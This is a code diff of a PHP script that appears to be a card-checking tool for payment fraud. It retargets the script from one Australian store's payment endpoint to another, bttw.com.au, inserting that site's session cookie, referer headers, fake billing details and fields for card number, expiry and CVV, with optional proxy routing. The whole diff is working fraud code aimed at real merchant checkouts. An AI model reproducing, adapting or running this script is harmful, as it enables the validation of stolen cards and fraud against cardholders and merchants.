@@ -46,10 +46,10 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
-If(strlen($ano) > 2)
-{
-  $ano = substr($ano,2,2);
-}
+// If(strlen($ano) > 2)
+// {
+//   $ano = substr($ano,2,2);
+// }
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -205,7 +205,7 @@ curl_close($ch);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.citytechnology.com.au/store/index.php?route=payment/anz/send');
+curl_setopt($ch, CURLOPT_URL, 'https://bttw.com.au/index.php?route=extension/payment/migs_gateway_merchant/send');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -237,17 +237,16 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'Accept: application/json, text/javascript, */*; q=0.01',
 'Accept-Encoding: gzip, deflate, br',
 'Accept-Language: en-US,en;q=0.9',
-'Content-Type: application/x-www-form-urlencoded',
-'Cookie: display=list; PHPSESSID=b94bd6f1b55120302e991e902339caee; language=en; currency=AUD',
-'Host: www.citytechnology.com.au',
-'Origin: https://www.citytechnology.com.au',
-'Referer: https://www.citytechnology.com.au/store/index.php?route=checkout/checkout',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: OCSESSID=ce25908ab86a67a9ebcfe5d612; language=en-gb; currency=AUD; mailchimp_integration_popup=triggered',
+'origin: https://bttw.com.au',
+'referer: https://bttw.com.au/index.php?route=checkout/checkout',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'vpc_CardNum='.$cc.'&selMonth='.$mes.'&selYear='.$ano.'&vpc_CardSecurityCode='.$cvv.'');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'firstname=Vincent&lastname=Warner&company=&address_1=12+Avenue+Road&address_2=&city=HIGHGATE&postcode=5063&country_id=13&zone_id=195&=Continue&card_type=visa&card_name=Vincent+Warner&card_num='.$cc.'&card_mon='.$mes.'&card_year='.$ano.'&card_cvv='.$cvv.'&=Continue');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
